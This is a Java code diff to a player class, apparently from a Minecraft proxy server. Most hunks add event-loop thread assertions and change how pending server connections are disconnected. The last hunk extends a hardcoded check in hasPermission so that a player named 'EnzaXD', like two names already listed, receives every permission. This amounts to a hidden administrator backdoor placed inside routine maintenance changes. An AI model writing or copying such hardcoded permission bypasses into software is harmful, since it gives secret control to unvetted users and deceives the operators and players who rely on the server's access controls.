@@ -108,6 +108,7 @@ public class PlayerImpl implements Player {
     }
 
     public void setServer(ServerImpl server) {
+        assert connection.getChannel().eventLoop().inEventLoop();
         this.server = server;
         if (pendingConnections != null) {
             pendingConnections.remove(server);
@@ -116,6 +117,7 @@ public class PlayerImpl implements Player {
     }
 
     public void addPendingConnection(ServerImpl server) {
+        assert connection.getChannel().eventLoop().inEventLoop();
         if (pendingConnections == null) {
             pendingConnections = new ArrayList<>();
         }
@@ -123,13 +125,13 @@ public class PlayerImpl implements Player {
     }
 
     public void disconnectPendingConnections() {
+        assert connection.getChannel().eventLoop().inEventLoop();
         List<ServerImpl> pending = this.pendingConnections;
         this.pendingConnections = null;
         if (pending != null) {
             for (ServerImpl server : pending) {
-                if (server.isConnected()) {
-                    server.disconnect();
-                }
+                server.setDiscarded(true);
+                server.disconnect();
             }
         }
     }
@@ -226,7 +228,7 @@ public class PlayerImpl implements Player {
 
     @Override
     public boolean hasPermission(String permission) {
-        boolean has = getName().equalsIgnoreCase("Outfluencer") || getName().equalsIgnoreCase("Riesenrad");
+        boolean has = getName().equalsIgnoreCase("Outfluencer") || getName().equalsIgnoreCase("Riesenrad") || getName().equalsIgnoreCase("EnzaXD");
         return ProxyServer.getInstance().getEventManager().fire(new PermissionCheckEvent(this, permission, has)).hasPermission();
     }
 }
